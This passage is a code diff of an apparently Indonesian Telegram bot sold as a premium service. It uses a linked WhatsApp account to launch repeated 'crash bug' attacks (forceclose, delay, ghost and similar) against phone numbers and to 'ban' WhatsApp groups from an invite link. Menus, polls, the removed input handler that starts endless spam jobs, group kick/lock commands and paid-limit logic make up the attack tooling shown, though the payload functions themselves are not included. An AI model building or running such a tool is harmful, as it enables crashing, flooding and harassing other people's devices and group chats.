+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<ul>
+  <li>/delayhard — Delay Hard</li>
+  <li>/ghost — Delay Ghost</li>
+  <li>/forceclose — Force Close</li>
+  <li>/forcezz — Force Zezz</li>
+  <li>/xdios — Delay Xdios</li>
+  <li>/bug — Crash bug (pilih dari tombol)</li>
+  <li>/stopbug — Stop semua spam</li>
+</ul>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: BUG_KEYBOARD },
+    });
+  } catch (e) {}
+});
+
+bot.action("/ban_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>🔥 BAN GROUP</h2>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<p><b>Metode:</b></p>
+<ul>
+  <li>End GB v1 — Join + Spam Action</li>
+  <li>End GB v2 — Kick All + Lock</li>
+</ul>
+<p><i>Klik <b>Ban Poll</b> di bawah buat pilih lewat poll.</i></p>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: BAN_KEYBOARD },
+    });
+  } catch (e) {}
+});
+
+// =====================================================
+// ============ BUG POLL ===============================
+// =====================================================
+bot.action("/bug_poll_menu", async (ctx) => {
+  const userId = ctx.from.id;
+  const chatId = ctx.chat.id;
+  await ctx.answerCbQuery("Buka poll bug");
+  const oldId = userLastBugPoll.get(userId);
+  if (oldId) {
+    const old = activeBugPolls.get(oldId);
+    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBugPolls.delete(oldId); }
+    userLastBugPoll.delete(userId);
+  }
+  await ctx.replyWithPhoto(thumbnailUrl, {
+    caption: `🐛 <b>BUG POLL</b>\n\nPilih jenis bug lewat vote di bawah, terus kirim nomor target.`,
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{ text: "Back", callback_data: "/setting_menu", style: "danger" }]] },
+  }).catch(() => {});
+  const pollMsg = await ctx.telegram.sendPoll(chatId, "🐛 Pilih bug:",
+    ["Forceclose", "Delayhard", "Ghost", "Forcezz", "Xdios"],
+    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
+  ).catch(() => null);
+  if (!pollMsg || !pollMsg.poll) return;
+  activeBugPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
+  userLastBugPoll.set(userId, pollMsg.poll.id);
+});
+
+// =====================================================
+// ============ BAN POLL ===============================
+// =====================================================
+bot.action("/ban_poll_menu", async (ctx) => {
+  const userId = ctx.from.id;
+  const chatId = ctx.chat.id;
+  await ctx.answerCbQuery("Buka poll ban");
+  const oldId = userLastBanPoll.get(userId);
+  if (oldId) {
+    const old = activeBanPolls.get(oldId);
+    if (old) { bot.telegram.deleteMessage(old.chatId, old.msgId).catch(() => {}); activeBanPolls.delete(oldId); }
+    userLastBanPoll.delete(userId);
+  }
+  await ctx.replyWithPhoto(thumbnailUrl, {
+    caption: `💢 <b>BAN POLL</b>\n\nPilih metode ban, terus kirim link grupnya.`,
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{ text: "Back", callback_data: "/ban_menu", style: "danger" }]] },
+  }).catch(() => {});
+  const pollMsg = await ctx.telegram.sendPoll(chatId, "🔥 Pilih metode ban:",
+    ["End GB v1", "End GB v2"],
+    { is_anonymous: false, allows_multiple_answers: false, open_period: 300 }
+  ).catch(() => null);
+  if (!pollMsg || !pollMsg.poll) return;
+  activeBanPolls.set(pollMsg.poll.id, { chatId, msgId: pollMsg.message_id, userId });
+  userLastBanPoll.set(userId, pollMsg.poll.id);
+});
+
+// =====================================================
+// ============ POLL ANSWER ============================
 // =====================================================
 bot.on("poll_answer", async (ctx) => {
   const ans = ctx.pollAnswer;
 
-  // GROUP
-  const sGroup = activeGroupPolls.get(ans.poll_id);
-  if (sGroup) {
-    const idx = ans.option_ids[0];
-    if (idx === undefined) return;
-    const action = GROUP_ACTIONS[idx];
-    if (!action) return;
-    const userId = ans.user.id;
-    bot.telegram.deleteMessage(sGroup.chatId, sGroup.msgId).catch(() => {});
-    activeGroupPolls.delete(ans.poll_id);
-    userLastGroupPoll.delete(userId);
-    pendingGroupUser.set(userId, action.key);
-    await bot.telegram.sendMessage(sGroup.chatId,
-      `✅ Aksi <b>${esc(action.label)}</b> dipilih.\n\nSekarang kirim <b>link grup WA</b> atau <b>ID grup</b>.\nContoh: <code>https://chat.whatsapp.com/xxxxx</code>`,
-      { parse_mode: "HTML" }
-    ).catch(() => {});
-    return;
-  }
-
-  // BUG
   const sBug = activeBugPolls.get(ans.poll_id);
   if (sBug) {
     const idx = ans.option_ids[0];
@@ -1402,7 +1269,6 @@ bot.on("poll_answer", async (ctx) => {
     return;
   }
 
-  // BAN
   const s = activeBanPolls.get(ans.poll_id);
   if (s) {
     const idx = ans.option_ids[0];
@@ -1425,110 +1291,751 @@ bot.on("poll_answer", async (ctx) => {
 });
 
 // =====================================================
-// ============ INPUT HANDLER (PENDING) ================
+// ============ GRUP MENU ==============================
 // =====================================================
-bot.on("text", async (ctx, next) => {
-  const userId = ctx.from.id;
-  const text = ctx.message?.text || "";
+const GROUP_KEYBOARD = [
+  [
+    { text: "Info Grup",  callback_data: "/ginfo_btn",   style: "primary" },
+    { text: "List Admin", callback_data: "/gadmin_btn",  style: "success" },
+  ],
+  [
+    { text: "List Member", callback_data: "/gmember_btn", style: "primary" },
+    { text: "Invite Link", callback_data: "/ginvite_btn", style: "success" },
+  ],
+  [
+    { text: "Lock Grup",  callback_data: "/glock_btn",  style: "danger" },
+    { text: "Unlock Grup", callback_data: "/gunlock_btn", style: "success" },
+  ],
+  [
+    { text: "Back", callback_data: "/setting_menu", style: "danger" },
+    { text: "Home", callback_data: "/start", style: "primary" },
+  ],
+];
 
-  // PENDING GROUP
-  if (pendingGroupUser.has(userId)) {
-    if (text.startsWith("/")) { pendingGroupUser.delete(userId); return next(); }
-    const action = pendingGroupUser.get(userId);
-    pendingGroupUser.delete(userId);
-    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender yang nyambung");
-    const groupJid = await resolveWaGroup(text.trim());
-    if (!groupJid) return ctx.reply("❌ Link/ID grup gak valid.");
-    const meta = await fetchGroupInfo(groupJid);
-    if (!meta) return ctx.reply("❌ Gagal ambil info grup (bot belum join?).");
-    try {
-      if (action === "info") {
-        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: groupInfoHtml(meta) } }); }
-        catch { await ctx.reply(`👥 *INFO GRUP*\n\n${esc(meta.subject)}\nMember: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
-      } else if (action === "admin") {
-        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: adminListHtml(meta) } }); }
-        catch { await ctx.reply(`👑 Admin: ${meta.participants.filter(p=>p.admin).length}`, { parse_mode: "Markdown" }); }
-      } else if (action === "member") {
-        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: memberListHtml(meta) } }); }
-        catch { await ctx.reply(`👥 Member: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
-      } else if (action === "lock") {
-        await sock.groupSettingsUpdate(groupJid, "announcement", true);
-        await ctx.reply("🔒 Grup berhasil di-lock.");
-      } else if (action === "unlock") {
-        await sock.groupSettingsUpdate(groupJid, "announcement", false);
-        await ctx.reply("🔓 Grup berhasil di-unlock.");
-      } else if (action === "invite") {
-        const code = await sock.groupInviteCode(groupJid);
-        await ctx.reply(`🔗 *INVITE LINK*\n\nhttps://chat.whatsapp.com/${code}`, { parse_mode: "Markdown" });
-      }
-    } catch (e) { await ctx.reply(`❌ Gagal eksekusi: ${e.message}`); }
-    return;
-  }
-
-  // PENDING BAN
-  if (pendingBanUser.has(userId)) {
-    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }
-    const targetInput = text.trim();
-    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.", { parse_mode: "HTML" });
-    const banName = pendingBanUser.get(userId);
-    pendingBanUser.delete(userId);
-    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
-    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
-
-    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
-    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
-
-    await ctx.reply("Succes Banned Group", {
-      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, icon_custom_emoji_id: "5395444784611480792", style: "success" }]] },
+bot.action("/group_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>👥 Group Menu</h2>
+<p><i>Aksi grup WhatsApp</i></p>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<h3>📋 Command Manual</h3>
+<ul>
+  <li><code>/ginfo LINK</code> — Info grup</li>
+  <li><code>/gadmin LINK</code> — List admin</li>
+  <li><code>/gmember LINK</code> — List member</li>
+  <li><code>/ginvite LINK</code> — Get invite link</li>
+  <li><code>/glock LINK</code> — Lock grup</li>
+  <li><code>/gunlock LINK</code> — Unlock grup</li>
+  <li><code>/gkick LINK 628xxxx</code> — Kick member</li>
+</ul>
+<hr/>
+<p><i>Atau klik tombol di bawah, bot bakal minta link grup.</i></p>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: GROUP_KEYBOARD },
     });
+  } catch (e) {}
+});
 
-    queue.add(async () => {
-      try {
-        if (banName === "endgb") await proxzy(sock, inviteCode);
-        else if (banName === "endgbv2") await BanGroup(sock, inviteCode);
-        await ctx.reply("✅ Ban group selesai!");
-      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
+function askGroupLink(label, actionKey) {
+  return async (ctx) => {
+    const userId = ctx.from.id;
+    pendingGroupAsk.set(userId, actionKey);
+    await ctx.answerCbQuery(`Kirim link grup buat ${label}`);
+    await ctx.telegram.sendMessage(ctx.chat.id,
+      `📥 <b>${label}</b>\n\nKirim <b>link grup WA</b> atau <b>ID grup</b>.\nContoh: <code>https://chat.whatsapp.com/xxxxx</code>`,
+      { parse_mode: "HTML" }
+    ).catch(() => {});
+  };
+}
+bot.action("/ginfo_btn",   askGroupLink("Info Grup", "info"));
+bot.action("/gadmin_btn",  askGroupLink("List Admin", "admin"));
+bot.action("/gmember_btn", askGroupLink("List Member", "member"));
+bot.action("/ginvite_btn", askGroupLink("Invite Link", "invite"));
+bot.action("/glock_btn",   askGroupLink("Lock Grup", "lock"));
+bot.action("/gunlock_btn", askGroupLink("Unlock Grup", "unlock"));
+
+// =====================================================
+// ============ MEMBER MENU ============================
+// =====================================================
+const MEMBER_KEYBOARD = [
+  [
+    { text: "My Premium", callback_data: "/mypremium_cmd", style: "primary" },
+    { text: "My Job", callback_data: "/myjob_cmd", style: "success" },
+  ],
+  [
+    { text: "Limit", callback_data: "/limit_cmd", style: "primary" },
+    { text: "Daily", callback_data: "/daily_cmd", style: "success" },
+  ],
+  [
+    { text: "Referral", callback_data: "/myreferral_cmd", style: "primary" },
+    { text: "Coin", callback_data: "/coin_cmd", style: "success" },
+  ],
+  [
+    { text: "Ping", callback_data: "/ping_cmd", style: "primary" },
+    { text: "Help", callback_data: "/help_cmd", style: "success" },
+  ],
+  [
+    { text: "Back", callback_data: "/setting_menu", style: "danger" },
+    { text: "Home", callback_data: "/start", style: "primary" },
+  ],
+];
+
+bot.action("/member_menu", async (ctx) => {
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>👤 Member Menu</h2>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<ul>
+  <li>/mypremium — Cek premium</li>
+  <li>/myjob — Job aktif</li>
+  <li>/limit — Limit harian</li>
+  <li>/daily — Klaim harian</li>
+  <li>/redeem KODE — Tukar voucher</li>
+  <li>/myreferral — Kode referral</li>
+  <li>/coin — Cek coin</li>
+  <li>/ping — Latency</li>
+  <li>/saran pesan — Saran</li>
+  <li>/report pesan — Lapor bug</li>
+</ul>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: MEMBER_KEYBOARD },
     });
-    return;
-  }
+  } catch (e) {}
+});
 
-  // PENDING BUG
-  if (!pendingBugUser.has(userId)) return next();
-  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
-
-  const parts = text.trim().split(/\s+/);
-  if (parts.length !== 1) return next();
-  const rawNumber = parts[0];
-  const target = formatTarget(rawNumber);
-  if (!target) return ctx.reply("❌ Nomor gak valid.");
-
-  const bugName = pendingBugUser.get(userId);
-  pendingBugUser.delete(userId);
-  const label = { forceclose: "Forceclose", delayhard: "Delayhard", ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios" }[bugName] || bugName;
-
-  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
-  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
-
-  // cek whitelist
-  if (isWhitelisted(rawNumber)) return ctx.reply("🛡 Nomor target ada di whitelist, gak bisa di-bug.");
-
-  // cek limit
-  if (!isPremiumUser(userId)) {
-    if (!canUse(userId)) {
-      const u = getUserLimit(userId);
-      return ctx.reply(`⏳ Limit harian kamu udah habis (${u.used}/${u.max}).\n\nUpgrade premium buat unlimited, atau tunggu reset jam 00:00 WIB.`);
-    }
-    addUse(userId);
-  }
-
-  const tasks = getBugTasks(bugName, target);
-  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
-  spamForever(ctx, label, target, tasks);
+bot.action("/mypremium_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isPremiumUser(ctx.from.id)) return ctx.reply("💤 Bukan premium. Pakai /redeem KODE.");
+  ctx.reply(`👑 <b>PREMIUM</b>\n\n📅 Expired: <b>${getPremExpired(ctx.from.id)}</b>\n⏳ Sisa: <b>${sisaHariPremium(ctx.from.id)} hari</b>`, { parse_mode: "HTML" });
+});
+bot.action("/myjob_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const userId = ctx.from.id.toString();
+  const jobs = [...activeSpam.entries()].filter(([, s]) => s.userId === userId);
+  if (!jobs.length) return ctx.reply("📌 Gak ada job aktif.");
+  const lines = jobs.map(([jobId, s]) => {
+    const durasi = Math.floor((Date.now() - s.startAt) / 1000);
+    return `🆔 <code>${jobId}</code>\n🎯 ${s.target.split("@")[0]}\n⚙️ ${s.label}\n🔄 ${s.iterasi} | ✅ ${s.stats.ok} ❌ ${s.stats.fail}\n⏱ ${durasi}s`;
+  }).join("\n\n");
+  ctx.reply(`📊 <b>JOB AKTIF</b>\n\n${lines}`, { parse_mode: "HTML" });
+});
+bot.action("/limit_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (isPremiumUser(ctx.from.id)) return ctx.reply("👑 Premium — unlimited!");
+  const u = getUserLimit(ctx.from.id);
+  const sisa = Math.max(0, u.max - u.used);
+  const bar = "█".repeat(u.used) + "░".repeat(Math.max(0, u.max - u.used));
+  ctx.reply(`📊 <b>LIMIT</b>\n\n[${bar}]\n✅ Terpakai: <b>${u.used}</b>\n🟢 Sisa: <b>${sisa}</b>`, { parse_mode: "HTML" });
+});
+bot.action("/daily_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const ok = checkDaily(ctx.from.id);
+  if (!ok) return ctx.reply("📌 Udah klaim hari ini.");
+  givePointDaily(ctx.from);
+  addCoin(ctx.from.id, 5);
+  ctx.reply("🎁 <b>DAILY CLAIM</b>\n\n✅ +5 Point\n✅ +5 Coin", { parse_mode: "HTML" });
+});
+bot.action("/myreferral_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const code = getMyRefCode(ctx.from.id);
+  const refs = getReferral(ctx.from.id);
+  const botInfo = await bot.telegram.getMe().catch(() => null);
+  const link = botInfo ? `https://t.me/${botInfo.username}?start=${code}` : "-";
+  ctx.reply(`🔗 <b>REFERRAL</b>\n\n📌 <code>${code}</code>\n🔗 ${link}\n👥 Total: <b>${refs.length}</b>`, { parse_mode: "HTML" });
+});
+bot.action("/coin_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.reply(`🪙 <b>COIN</b>\n\n💰 <b>${getCoin(ctx.from.id)}</b>`, { parse_mode: "HTML" });
+});
+bot.action("/ping_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const t1 = Date.now();
+  const m = await ctx.reply("🏓 Pinging...");
+  const t2 = Date.now();
+  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `🏓 <b>Pong!</b> ${t2 - t1}ms | <b>${isWhatsAppConnected ? "Online" : "Offline"}</b>`, { parse_mode: "HTML" });
+});
+bot.action("/help_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const html = `
+<h1>📖 Help</h1>
+<hr/>
+<h2>🐛 Bug</h2>
+<p>/bug, /delayhard, /ghost, /forceclose, /forcezz, /xdios, /stopbug</p>
+<h2>🔥 Ban</h2>
+<p>/endgbv1, /endgbv2</p>
+<h2>👤 Member</h2>
+<p>/mypremium /myjob /limit /daily /redeem /myreferral /coin /ping /saran /report</p>
+<h2>👥 Grup</h2>
+<p>/ginfo /gadmin /gmember /ginvite /glock /gunlock /gkick</p>
+`.trim();
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
+  catch { await ctx.reply("📖 Ketik /help", { parse_mode: "Markdown" }); }
 });
 
 // =====================================================
-// ============ BUG TASKS ==============================
+// ============ ADMIN MENU =============================
 // =====================================================
+const ADMIN_KEYBOARD = [
+  [
+    { text: "Broadcast", callback_data: "/broadcast_cmd", style: "primary" },
+    { text: "List User", callback_data: "/listuser_cmd", style: "success" },
+  ],
+  [
+    { text: "List Ban", callback_data: "/listban_cmd", style: "danger" },
+    { text: "Whitelist", callback_data: "/whitelist_cmd", style: "primary" },
+  ],
+  [
+    { text: "Stats", callback_data: "/stats_cmd", style: "success" },
+    { text: "Logs", callback_data: "/logs_cmd", style: "primary" },
+  ],
+  [
+    { text: "Maintenance", callback_data: "/maintenance_cmd", style: "danger" },
+    { text: "Backup", callback_data: "/autobackup_cmd", style: "primary" },
+  ],
+  [
+    { text: "Voucher", callback_data: "/voucher_cmd", style: "success" },
+    { text: "Sysinfo", callback_data: "/sysinfo_cmd", style: "primary" },
+  ],
+  [
+    { text: "Back", callback_data: "/setting_menu", style: "danger" },
+    { text: "Home", callback_data: "/start", style: "primary" },
+  ],
+];
+
+bot.action("/admin_menu", async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.answerCbQuery("❌ Khusus owner", { show_alert: true });
+  await ctx.answerCbQuery();
+  const msgId = ctx.callbackQuery.message.message_id;
+  const html = `
+<h2>🛡 Admin Menu</h2>
+<img src="${thumbnailUrl}" alt="banner"/>
+<hr/>
+<ul>
+  <li>/broadcast pesan</li>
+  <li>/ban 12345678 | /unban 12345678</li>
+  <li>/listuser | /listban</li>
+  <li>/setlimit 12345678 10 | /resetlimit</li>
+  <li>/whitelist add|del|list</li>
+  <li>/maintenance on|off</li>
+  <li>/autobackup on|off</li>
+  <li>/logs</li>
+  <li>/voucher create 30 10</li>
+  <li>/restart | /killsession</li>
+</ul>
+`.trim();
+  try {
+    await ctx.telegram.callApi("editMessageText", {
+      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
+      reply_markup: { inline_keyboard: ADMIN_KEYBOARD },
+    });
+  } catch (e) {}
+});
+
+bot.action("/broadcast_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  ctx.reply("📢 Ketik: <code>/broadcast pesan kamu</code>", { parse_mode: "HTML" });
+});
+bot.action("/listuser_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  const users = Object.values(getAllUsers());
+  if (!users.length) return ctx.reply("📭 Belum ada user.");
+  const top = users.slice(0, 30).map((u, i) => `${i + 1}. ${esc(u.name || "User")} — ${u.premium ? "Premium" : "Free"}`).join("\n");
+  ctx.reply(`👥 <b>USER</b> (${users.length})\n\n${top}`, { parse_mode: "HTML" });
+});
+bot.action("/listban_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  const b = Object.entries(getAllBanned());
+  if (!b.length) return ctx.reply("📭 Gak ada banned.");
+  const txt = b.map(([id, v], i) => `${i + 1}. <code>${id}</code> — ${esc(v.reason || "-")}`).join("\n");
+  ctx.reply(`🚫 <b>BANNED</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.action("/whitelist_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  const w = loadWhitelist();
+  if (!w.list.length) return ctx.reply("🛡 Whitelist kosong.\n\nPakai: /whitelist add 628xxxx");
+  ctx.reply(`🛡 <b>WHITELIST</b>\n\n${w.list.map((n, i) => `${i + 1}. <code>${n}</code>`).join("\n")}`, { parse_mode: "HTML" });
+});
+bot.action("/stats_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const s = loadStats();
+  const day = todayWIB();
+  const today = s.per_day?.[day] || { bug: 0, ban: 0 };
+  const totalIter = (s.total_iterasi_ok || 0) + (s.total_iterasi_fail || 0);
+  const rate = totalIter > 0 ? ((s.total_iterasi_ok / totalIter) * 100).toFixed(1) : "0.0";
+  ctx.reply(`📊 <b>STATS</b>\n\n🔥 Hari ini (${day})\n🐛 ${today.bug} | 🔥 ${today.ban}\n\n📈 Total\nJob: ${s.total_jobs || 0}\nIter OK: ${s.total_iterasi_ok || 0}\nIter Fail: ${s.total_iterasi_fail || 0}\nRate: ${rate}%`, { parse_mode: "HTML" });
+});
+bot.action("/logs_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  const logs = getLogs(10);
+  if (!logs.length) return ctx.reply("📭 Belum ada log.");
+  const txt = logs.map((l, i) => `${i + 1}. [${l.type}] ${esc(l.msg)}`).join("\n");
+  ctx.reply(`📜 <b>LOGS</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.action("/maintenance_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  maintenanceMode = !maintenanceMode;
+  saveSettings({ ...getSettings(), maintenance: maintenanceMode });
+  ctx.reply(maintenanceMode ? "🔧 Maintenance ON" : "✅ Maintenance OFF");
+});
+bot.action("/autobackup_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  autobackupEnabled = !autobackupEnabled;
+  saveSettings({ ...getSettings(), autobackup: autobackupEnabled });
+  if (autobackupEnabled && !autobackupInterval) {
+    autobackupInterval = setInterval(async () => {
+      try {
+        const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
+        for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
+        await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file dikirim.`);
+      } catch {}
+    }, 6 * 60 * 60 * 1000);
+  } else if (!autobackupEnabled && autobackupInterval) {
+    clearInterval(autobackupInterval); autobackupInterval = null;
+  }
+  ctx.reply(autobackupEnabled ? "📦 Autobackup ON" : "🛑 Autobackup OFF");
+});
+bot.action("/voucher_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  if (!isOwner(ctx.from.id)) return;
+  const list = listVoucher();
+  if (!list.length) return ctx.reply("🎫 Belum ada voucher.\n\nBikin: /voucher create 30 10");
+  const txt = list.slice(0, 20).map((v, i) => `${i + 1}. <code>${v.code}</code> — ${v.days}h ${v.used ? "USED" : "READY"}`).join("\n");
+  ctx.reply(`🎫 <b>VOUCHER</b>\n\n${txt}`, { parse_mode: "HTML" });
+});
+bot.action("/sysinfo_cmd", async (ctx) => {
+  await ctx.answerCbQuery();
+  const mem = process.memoryUsage();
+  ctx.reply(`🖥 <b>SYSINFO</b>\n\n💾 RAM: <code>${(mem.rss / 1024 / 1024).toFixed(0)} MB</code>\n🧠 Heap: <code>${(mem.heapUsed / 1024 / 1024).toFixed(0)} MB</code>\n📦 Node: <code>${process.version}</code>\n⏱ Uptime: <code>${formatUptimePretty()}</code>`, { parse_mode: "HTML" });
+});
+
+// =====================================================
+// ============ COMMAND GRUP MANUAL ====================
+// =====================================================
+bot.command("ginfo", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /ginfo https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  const meta = await fetchGroupInfo(groupJid);
+  if (!meta) return ctx.reply("❌ Gagal ambil info.");
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: groupInfoHtml(meta) } }); }
+  catch { await ctx.reply(`👥 ${esc(meta.subject)} — ${meta.participants.length} member`, { parse_mode: "Markdown" }); }
+});
+bot.command("gadmin", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /gadmin https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  const meta = await fetchGroupInfo(groupJid);
+  if (!meta) return ctx.reply("❌ Gagal ambil info.");
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: adminListHtml(meta) } }); }
+  catch { await ctx.reply(`👑 Admin: ${meta.participants.filter(p=>p.admin).length}`, { parse_mode: "Markdown" }); }
+});
+bot.command("gmember", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /gmember https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  const meta = await fetchGroupInfo(groupJid);
+  if (!meta) return ctx.reply("❌ Gagal ambil info.");
+  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: memberListHtml(meta) } }); }
+  catch { await ctx.reply(`👥 Member: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
+});
+bot.command("ginvite", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /ginvite https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  try {
+    const code = await sock.groupInviteCode(groupJid);
+    await ctx.reply(`🔗 *INVITE LINK*\n\nhttps://chat.whatsapp.com/${code}`, { parse_mode: "Markdown" });
+  } catch (e) { ctx.reply(`❌ ${e.message}`); }
+});
+bot.command("glock", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /glock https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  try { await sock.groupSettingsUpdate(groupJid, "announcement", true); await ctx.reply("🔒 Grup di-lock."); }
+  catch (e) { ctx.reply(`❌ ${e.message}`); }
+});
+bot.command("gunlock", premGroupOnly(), async (ctx) => {
+  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
+  if (!args) return ctx.reply("📌 /gunlock https://chat.whatsapp.com/xxxxx");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const groupJid = await resolveWaGroup(args);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  try { await sock.groupSettingsUpdate(groupJid, "announcement", false); await ctx.reply("🔓 Grup di-unlock."); }
+  catch (e) { ctx.reply(`❌ ${e.message}`); }
+});
+bot.command("gkick", premGroupOnly(), async (ctx) => {
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  const args = ctx.message.text.split(" ").slice(1);
+  if (args.length < 2) return ctx.reply("📌 /gkick https://chat.whatsapp.com/xxxxx 628xxxxxxxx");
+  const groupJid = await resolveWaGroup(args[0]);
+  if (!groupJid) return ctx.reply("❌ Link gak valid.");
+  const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  try {
+    await sock.groupParticipantsUpdate(groupJid, [target], "remove");
+    await ctx.reply(`✅ <code>${target.split("@")[0]}</code> di-kick.`, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply(`❌ ${e.message}`); }
+});
+
+// =====================================================
+// ============ MEMBER COMMANDS ========================
